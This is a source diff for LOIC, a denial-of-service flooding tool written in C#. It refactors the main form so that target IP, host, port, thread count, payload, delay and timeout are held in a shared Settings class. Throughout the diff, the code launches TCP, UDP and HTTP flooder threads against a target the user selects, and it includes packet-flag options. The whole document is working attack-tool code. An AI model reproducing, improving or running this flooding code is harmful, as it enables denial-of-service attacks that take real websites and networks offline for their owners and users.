@@ -323,7 +323,7 @@ namespace LOIC
 				this.WindowState = FormWindowState.Minimized;
 				this.ShowInTaskbar = false;
 			}
-			this.FormClosing += frmMain_Closing;
+
 			if (hive) enableHive.Checked = true;
 			if (!hive) disableHive.Checked = true;
 
@@ -335,22 +335,15 @@ namespace LOIC
 				MessageBox.Show("Winpcap is missing or not installed. Please fix this!");
 				btnAttack.Enabled = false;
 
-				for (int i = 0; i != allDevices.Count(); ++i)
-				{
-					cbAdapter.Items.Add(allDevices[i].Description);
-				}
+			}
+			for (int i = 0; i != allDevices.Count(); ++i)
+			{
+				cbAdapter.Items.Add(allDevices[i].Description);
 			}
 		}
 
 		private static XXPFlooder[] xxp;
 		private static HTTPFlooder[] http;
-		private static string _targetHost, _targetIp, _method, _payload, _relativePath;
-		private static int _targetPort, _numThreads, _protocol, _delay, _timeout;
-		private static bool _intShowStats;
-
-		private PacketDevice _selectedDevice;
-
-		private AttackTypes _attackType;
 
 		private void Attack(bool toggle, bool on, bool silent)
 		{
@@ -358,40 +351,8 @@ namespace LOIC
 			{
 				try
 				{
-					try { _targetPort = Convert.ToInt32(txtPort.Text); }
-					catch { throw new Exception("I don't think ports are supposed to be written like THAT."); }
-
-					try { _numThreads = Convert.ToInt32(txtThreads.Text); }
-					catch { throw new Exception("What on earth made you put THAT in the threads field?"); }
-
-					_targetIp = txtTarget.Text;
-					if (String.IsNullOrEmpty(_targetIp) || String.Equals(_targetIp, "N O N E !"))
-						throw new Exception("Select a target.");
-
-					if (String.IsNullOrEmpty(_targetHost)) _targetHost = _targetIp;
-					if (!_targetHost.Contains("://")) _targetHost = String.Concat("http://", _targetHost);
-					_targetHost = new Uri(_targetHost).Host;
-
-					_protocol = 0;
-					_method = cbMethod.Text;
-					//todo remove this shit
-					if (String.Equals(_method, "TCP")) _protocol = 1;
-					if (String.Equals(_method, "UDP")) _protocol = 2;
-					if (String.Equals(_method, "HTTP")) _protocol = 3;
-
-					if (_protocol == 0)
+					if (Settings.AttackType == 0)
 						throw new Exception("Select a proper attack method.");
-
-					_payload = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
-					if (String.IsNullOrEmpty(_payload) && (_protocol == 1 || _protocol == 2))
-						throw new Exception("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");
-
-					_relativePath = txtSubsite.Text;
-					if (!_relativePath.StartsWith("/") && (_protocol == 3))
-						throw new Exception("You have to enter a subsite (for example \"/\")");
-
-					try { _timeout = Convert.ToInt32(txtTimeout.Text); }
-					catch { throw new Exception("What's up with something like that in the timeout box? =S"); }
 				}
 				catch (Exception ex)
 				{
@@ -400,21 +361,21 @@ namespace LOIC
 				}
 				btnAttack.Text = "Stop flooding";
 
-				if (String.Equals(_method, "TCP") || String.Equals(_method, "UDP"))
+				if (String.Equals(Settings.Method, "TCP") || String.Equals(Settings.Method, "UDP"))
 				{
-					xxp = new XXPFlooder[_numThreads];
+					xxp = new XXPFlooder[Settings.NumThreads];
 					for (int a = 0; a < xxp.Length; a++)
 					{
-						xxp[a] = new XXPFlooder(_targetIp, _targetPort, _protocol, _delay, chkWaitReply.Checked, _payload, chkAllowRandom.Checked);
+						xxp[a] = new XXPFlooder(Settings.TargetIp, Settings.TargetPort, Settings.Protocol, Settings.Delay, chkWaitReply.Checked, Settings.Payload, chkAllowRandom.Checked);
 						xxp[a].Start();
 					}
 				}
-				else if (String.Equals(_method, "HTTP"))
+				else if (String.Equals(Settings.Method, "HTTP"))
 				{
-					http = new HTTPFlooder[_numThreads];
+					http = new HTTPFlooder[Settings.NumThreads];
 					for (int a = 0; a < http.Length; a++)
 					{
-						http[a] = new HTTPFlooder(_targetHost, _targetIp, _targetPort, _relativePath, chkWaitReply.Checked, _delay, _timeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
+						http[a] = new HTTPFlooder(Settings.TargetHost, Settings.TargetIp, Settings.TargetPort, Settings.RelativePath, chkWaitReply.Checked, Settings.Delay, Settings.Timeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
 						http[a].Start();
 					}
 				}
@@ -451,21 +412,21 @@ namespace LOIC
 				return;
 			}
 			txtTarget.Text = txtTargetIP.Text;
-			_targetHost = txtTargetIP.Text;
+			Settings.TargetHost = txtTargetIP.Text;
 		}
 
 		private void LockOnURL(bool silent)
 		{
-			_targetHost = txtTargetURL.Text.ToLower();
-			if (String.IsNullOrEmpty(_targetHost))
+			Settings.TargetHost = txtTargetURL.Text.ToLower();
+			if (String.IsNullOrEmpty(Settings.TargetHost))
 			{
 				if (silent) return;
 				new frmWtf().Show();
 				MessageBox.Show("A URL is fine too...", "What the shit.");
 				return;
 			}
-			if (!_targetHost.StartsWith("http://") && !_targetHost.StartsWith("https://")) _targetHost = String.Concat("http://", _targetHost);
-			try { txtTarget.Text = Dns.GetHostEntry(new Uri(_targetHost).Host).AddressList[0].ToString(); }
+			if (!Settings.TargetHost.StartsWith("http://") && !Settings.TargetHost.StartsWith("https://")) Settings.TargetHost = String.Concat("http://", Settings.TargetHost);
+			try { txtTarget.Text = Dns.GetHostEntry(new Uri(Settings.TargetHost).Host).AddressList[0].ToString(); }
 			catch
 			{
 				if (silent) return;
@@ -667,11 +628,11 @@ namespace LOIC
 
 		private void tShowStats_Tick(object sender, EventArgs e)
 		{
-			if (_intShowStats) return; _intShowStats = true;
+			if (Settings.IntShowStats) return; Settings.IntShowStats = true;
 
 			bool isFlooding = false;
 			if (btnAttack.Text == "Stop for now") isFlooding = true;
-			if (_protocol == 1 || _protocol == 2)
+			if (Settings.AttackType == AttackTypes.TcpFlood || Settings.AttackType == AttackTypes.UdpFlood)
 			{
 				int iFloodCount = 0;
 				for (int a = 0; a < xxp.Length; a++)
@@ -680,7 +641,7 @@ namespace LOIC
 				}
 				lbRequested.Text = iFloodCount.ToString();
 			}
-			if (_protocol == 3 && http != null)
+			if (Settings.AttackType == AttackTypes.HttpFlood && http != null)
 			{
 				int iIdle = 0;
 				int iConnecting = 0;
@@ -710,7 +671,7 @@ namespace LOIC
 						int iaRequested = http[a].Requested;
 						int iaFailed = http[a].Failed;
 						http[a] = null;
-						http[a] = new HTTPFlooder(_targetHost, _targetIp, _targetPort, _relativePath, chkWaitReply.Checked, _delay, _timeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
+						http[a] = new HTTPFlooder(Settings.TargetHost, Settings.TargetIp, Settings.TargetPort, Settings.RelativePath, chkWaitReply.Checked, Settings.Delay, Settings.Timeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
 						http[a].Downloaded = iaDownloaded;
 						http[a].Requested = iaRequested;
 						http[a].Failed = iaFailed;
@@ -726,24 +687,24 @@ namespace LOIC
 				lbIdle.Text = iIdle.ToString();
 			}
 
-			_intShowStats = false;
+			Settings.IntShowStats = false;
 		}
 
 		private void tbSpeed_ValueChanged(object sender, EventArgs e)
 		{
-			_delay = tbSpeed.Value;
+			Settings.Delay = tbSpeed.Value;
 			if (http != null)
 			{
 				for (int a = 0; a < http.Length; a++)
 				{
-					if (http[a] != null) http[a].Delay = _delay;
+					if (http[a] != null) http[a].Delay = Settings.Delay;
 				}
 			}
 			if (xxp != null)
 			{
 				for (int a = 0; a < xxp.Length; a++)
 				{
-					if (xxp[a] != null) xxp[a].Delay = _delay;
+					if (xxp[a] != null) xxp[a].Delay = Settings.Delay;
 				}
 			}
 		}
@@ -752,12 +713,26 @@ namespace LOIC
 		{
 			// set interface
 			IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
-			_selectedDevice = allDevices[cbAdapter.SelectedIndex];
-
+			Settings.SelectedDevice = allDevices[cbAdapter.SelectedIndex];
+			
 			// attack type
-			if (String.Equals(_method, "TCP")) _attackType = AttackTypes.TcpFlood;
-			if (String.Equals(_method, "UDP")) _attackType = AttackTypes.UdpFlood;
-			if (String.Equals(_method, "HTTP")) _attackType = AttackTypes.HttpFlood;
+			Settings.Method = cbMethod.Text;
+			if (String.Equals(Settings.Method, "TCP"))
+			{
+				Settings.AttackType = AttackTypes.TcpFlood;
+				//Settings.Protocol = 1;
+			}
+			if (String.Equals(Settings.Method, "UDP"))
+			{
+				Settings.AttackType = AttackTypes.UdpFlood;
+				 //Settings.Protocol = 2;
+			}
+			if (String.Equals(Settings.Method, "HTTP"))
+			{
+				Settings.AttackType = AttackTypes.HttpFlood; 
+				//Settings.Protocol = 3;
+			}
+			
 
 			// flags
 			Settings.SYN = cbSyn.Checked;
@@ -770,6 +745,40 @@ namespace LOIC
 			Settings.CWR = cbCwr.Checked;
 			Settings.NONE = cbNone.Checked;
 			Settings.NS = cbNs.Checked;
+
+			// target
+			try { Settings.TargetPort = Convert.ToInt32(txtPort.Text); }
+			catch { throw new Exception("I don't think ports are supposed to be written like THAT."); }
+
+			try { Settings.NumThreads = Convert.ToInt32(txtThreads.Text); }
+			catch { throw new Exception("What on earth made you put THAT in the threads field?"); }
+
+			try
+			{
+				Settings.TargetIp = txtTarget.Text;
+				if (String.IsNullOrEmpty(Settings.TargetIp) || String.Equals(Settings.TargetIp, "N O N E !"))
+					throw new Exception("Select a target.");
+			}
+			catch { throw new Exception("What on earth made you put THAT in the target field?"); }
+
+			if (String.IsNullOrEmpty(Settings.TargetHost)) Settings.TargetHost = Settings.TargetIp;
+			if (!Settings.TargetHost.Contains("://")) Settings.TargetHost = String.Concat("http://", Settings.TargetHost);
+			Settings.TargetHost = new Uri(Settings.TargetHost).Host;
+
+			
+
+			Settings.Payload = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
+			if (String.IsNullOrEmpty(Settings.Payload) && (Settings.AttackType == AttackTypes.TcpFlood || Settings.AttackType == AttackTypes.UdpFlood))
+				throw new Exception("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");
+
+			Settings.RelativePath = txtSubsite.Text;
+			if (!Settings.RelativePath.StartsWith("/") && (Settings.AttackType == AttackTypes.HttpFlood))
+				throw new Exception("You have to enter a subsite (for example \"/\")");
+
+			try { Settings.Timeout = Convert.ToInt32(txtTimeout.Text); }
+			catch { throw new Exception("What's up with something like that in the timeout box? =S"); }
+
+
 		}
 
 		private void label24_Click(object sender, EventArgs e)
